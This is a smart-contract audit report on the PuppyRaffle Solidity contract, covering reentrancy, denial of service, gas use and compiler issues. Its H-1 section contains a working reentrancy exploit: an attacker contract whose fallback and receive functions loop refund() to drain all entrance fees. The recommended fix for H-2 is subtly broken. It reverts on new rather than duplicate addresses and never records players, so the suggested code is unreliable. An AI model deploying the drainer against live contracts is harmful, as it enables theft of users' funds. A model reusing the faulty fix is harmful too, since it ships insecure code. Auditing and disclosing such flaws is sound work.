### [H-1] Reentrancy attack in `PuppyRaffle::refund` function allown entrant to drain raffle balance

**Description:**\
The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance. This occurs because the `PuppyRaffle::refund` function make a external call to msg.sender before update the `PuppyRaffle::players` array.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);
        
        emit RaffleRefunded(playerAddress);
    }
```
A player who has entered the raffle behind an another contract with a `fallback`/`receive` function in it, could call the `PuppyRaffle::refund` again and claim another refund. They could continue this cycle till the raffle contract balance is drained.

**Impact:**\
All fees paid by raffle entrants could be stolen by the malicious participant. 

**Proof of Concept:**

1. User enters the raffle
2. Attacker set up a contract with a `fallback` function that call `PuppyRaffle::refund`
3. Attacker enter the raffle from their attack contract setted contract
4. Attacker calls `PuppyRaffle::refund` from their attack contract

**Proof of Code:**
<details><summary>PoC</summary>


Paste the following into the ```PuppyRaffleTest.t.sol```

```javascript
function test_Audit_Reentrancy_Refund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

    ReentrancyAttacker reentrancyAttacker = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    uint256 startingAttackerContractBalance = address(attacker).balance;
    uint256 startingRaffleContractBalance = address(puppyRaffle).balance;

    console.log("Attacker contract start: ", startingAttackerContractBalance);
    console.log("Raffle contract start: ", startingRaffleContractBalance);

    vm.prank(attacker);
    reentrancyAttacker.attack{value: entranceFee}();

    uint256 endingAttackerContractBalance = address(reentrancyAttacker).balance;
    uint256 endingRaffleContractBalance = address(puppyRaffle).balance;

    assertEq(endingAttackerContractBalance, startingAttackerContractBalance + startingRaffleContractBalance);
    assertEq(endingRaffleContractBalance, 0);

    console.log("Attacker contract end: ", endingAttackerContractBalance);
    console.log("Raffle contract end: ", endingRaffleContractBalance);
}

```
An the attacker contract too:

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```
</details>

**Recommended Mitigation:**\
To prevent this, on the `PuppyRaffle::refund` function, update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);

-       emit RaffleRefunded(playerAddress);
    }
```


### [H-2] The For Loop on `Puppyraffle::enterRaffle` function is a potential denial of service (DoS) attack.

**Description:**\
The for loop inside the `Puppyraffle::enterRaffle` function runs through an increasing array of players searching for duplicate ones, opening the possibility that an attacker could pass player addresses multiple times, making the later calls more gas expensive than the earlier ones.  

```javascript
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(
                players[i] != players[j],
                "PuppyRaffle: Duplicate player"
            );
        }
    }
```

**Impact:**\
After the attack, the new costs of entering the raffle would discourage new real users.

**Proof of Concept:**\
If we have two sets of 100 players enter, the gas used will be as such:
- 1st 100 players: ~6503269 gas
- 2nd 100 players: ~18995097 gas

The second set is ~3x more expensive than the first.

<details>
<summary>PoC</summary>

Place the following test into `test/PuppyRaffleTest.t.sol`.

```javascript
function testDoSEnterRaffle() public {
    uint256 startGas;
    uint256 gasUsedFirst;
    uint256 gasUsedSecond;
    uint256 numOfPlayers = 100;
    address[] memory players = new address[](numOfPlayers);

    for (uint256 i = 0; i < numOfPlayers; i++) {
        players[i] = address(uint160(i));
    }
    startGas = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numOfPlayers}(players);
    gasUsedFirst = startGas - gasleft();

    for (uint256 i = 0; i < numOfPlayers; i++) {
        players[i] = address(uint160(i + numOfPlayers));
    }
    startGas = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numOfPlayers}(players);
    gasUsedSecond = startGas - gasleft();
    console.log("Gas used on first enterRaffle() call: ", gasUsedFirst);
    console.log("Gas used on second enterRaffle() call: ", gasUsedSecond);
    assert(gasUsedFirst < gasUsedSecond);
}
```
</details>

**Recommended Mitigation:**
1. Consider allow duplicate addresses, because users can make new wallet addresses anyways, so duplicate check doesn't prevent the same person from entering multiple times.
2. Refactory the function code using a mapping instead of an array for check duplicates addresses.

<details>
<summary>Code example</summary>

```diff
-   address[] public players;
+   mapping(address => bool) public players;
+   error Puppyraffle__NotDuplicateAddressAllowed(address duplicateAddress);

    function enterRaffle(address[] memory newPlayers) public payable {
        require(
            msg.value == entranceFee * newPlayers.length,
            "PuppyRaffle: Must send enough to enter raffle"
        );
+       // Revert with the custom error if a duplicate address is found
        for (uint256 i = 0; i < newPlayers.length; i++) {
-           players.push(newPlayers[i]);
+           if (!players[newPlayers[i]]) {
+               revert Puppyraffle__NotDuplicateAddressAllowed(newPlayers[i]);
+           }
+           players[newPlayers[i]];
        }

-       // Check for duplicates
-       // audit DoS
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(
-                   players[i] != players[j],
-                   "PuppyRaffle: Duplicate player"
-               );
-           }
-       }
        emit RaffleEnter(newPlayers);
    }
```
</details>

## Gas

### [G-1] Unchanged state variables should be declared constant or immutable.

**Description:**\
Reading from storage is more gas expensive than reading from a constant or inmmutable variable.

**Instances:**
- `PuppyRaffle::reffleDuration` should be `immutable`
- `PuppyRaffle::reffleStartTime` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`


### [G-2] Storage Array Length not Cached

Calling `.length` on a storage array in a loop condition is expensive. Consider caching the length in a local variable in memory before the loop and reusing it.

<details><summary>4 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 88](src/PuppyRaffle.sol#L88)

    ```solidity
            for (uint256 i = 0; i < players.length - 1; i++) {
    ```

- Found in src/PuppyRaffle.sol [Line: 89](src/PuppyRaffle.sol#L89)

    ```solidity
                for (uint256 j = i + 1; j < players.length; j++) {
    ```

- Found in src/PuppyRaffle.sol [Line: 115](src/PuppyRaffle.sol#L115)

    ```solidity
            for (uint256 i = 0; i < players.length; i++) {
    ```

- Found in src/PuppyRaffle.sol [Line: 186](src/PuppyRaffle.sol#L186)

    ```solidity
            for (uint256 i = 0; i < players.length; i++) {
    ```

</details>


**Recommended Mitigation:**
<details><summary>Code example</summary>

```diff
+   uint256 playersLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playersLength - 1; i++) {
-                for (uint256 j = i + 1; j < players.length; j++) {
+                for (uint256 j = i + 1; j < playersLength; j++) {
                    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                }
            }
```
</details>

## Informational

### [I-1] Unspecific Solidity Pragma

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

    ```solidity
    pragma solidity ^0.7.6;
    ```

</details>

### [I-2] Using an outdated version of Solidity is not recommended.

**Description:**\
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommended Mitigation:**\
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### [I-3] Address State Variable Set Without Checks

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)

    ```solidity
            feeAddress = _feeAddress;
    ```

- Found in src/PuppyRaffle.sol [Line: 179](src/PuppyRaffle.sol#L179)

    ```solidity
            feeAddress = newFeeAddress;
    ```

</details>
